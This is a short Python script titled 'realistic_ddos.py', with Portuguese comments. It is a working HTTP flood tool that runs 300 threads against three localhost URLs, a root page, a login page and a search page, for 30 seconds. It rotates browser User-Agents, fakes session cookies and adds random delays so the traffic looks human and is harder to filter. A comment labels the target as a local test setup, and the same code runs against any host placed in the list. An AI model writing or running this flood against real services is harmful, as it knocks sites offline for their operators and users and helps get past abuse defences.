# realistic_ddos.py
import threading
import requests
import random
import time

# Alvo local ou controlado para testes
TARGET_URLS = [
    "http://127.0.0.1:5100/",
    "http://127.0.0.1:5100/login",
    "http://127.0.0.1:5100/busca?q=produto"
]

# Lista realista de User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0)"
]

NUM_THREADS = 300
DURATION = 30  # Tempo do ataque em segundos

def attack():
    end_time = time.time() + DURATION
    while time.time() < end_time:
        url = random.choice(TARGET_URLS)
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Cookie": f"session_id={random.randint(10000,99999)}"
        }
        try:
            response = requests.get(url, headers=headers, timeout=2)
            print(f"[{threading.current_thread().name}] {url} -> {response.status_code}")
        except requests.exceptions.RequestException:
            print(f"[{threading.current_thread().name}] Falha na requisição.")
        
        # Espera aleatória para simular tráfego humano
        time.sleep(random.uniform(0.01, 0.3))

# Criar threads
threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=attack, name=f"Bot-{i}")
    t.start()
    threads.append(t)

for t in threads:
    t.join()
